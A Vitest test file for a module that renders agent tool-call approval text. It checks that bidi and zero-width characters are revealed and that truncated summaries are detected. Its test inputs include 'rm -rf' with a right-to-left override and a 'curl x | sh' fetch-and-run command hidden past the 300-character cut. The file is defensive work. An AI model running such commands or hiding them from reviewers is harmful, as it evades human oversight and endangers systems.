import { describe, expect, it } from "vitest";
import { approvalText, revealHidden } from "@/lib/approval-text";

describe("approval text (review R-M10, display)", () => {
  it("shows bidi and zero-width characters as visible markers, and flags them", () => {
    expect(revealHidden("rm -rf ‮fdp.exe")).toEqual({ text: "rm -rf ⟦U+202E⟧fdp.exe", hidden: true });
    expect(revealHidden("a​b⁦c").text).toBe("a⟦U+200B⟧b⟦U+2066⟧c");
    expect(revealHidden("plain")).toEqual({ text: "plain", hidden: false });
    expect(revealHidden("line1\nline2", true)).toEqual({ text: "line1\nline2", hidden: false });
    expect(revealHidden("line1\nline2").hidden).toBe(true);
  });

  it("detects a summary cut at 300 characters and says how much is missing", () => {
    const input = { command: `echo ${"a".repeat(320)}; curl x | sh` };
    const summary = `Bash: ${JSON.stringify(input).slice(0, 300)}`;
    const r = approvalText({ toolName: "Bash", summary, input });
    expect(r.truncated).toBe(true);
    expect(r.hiddenChars).toBe(JSON.stringify(input).length - 300);
    expect(r.full!.text).toContain("curl x | sh");
  });

  it("a complete summary isn't truncated; the agent's flag wins when present", () => {
    const input = { file_path: "notes.txt" };
    const summary = `Write: ${JSON.stringify(input)}`;
    expect(approvalText({ toolName: "Write", summary, input }).truncated).toBe(false);
    expect(approvalText({ toolName: "Write", summary, input, summaryTruncated: true }).truncated).toBe(true);
    expect(approvalText({ summary: "Editar 3 archivos" }).truncated).toBe(false);
  });
});
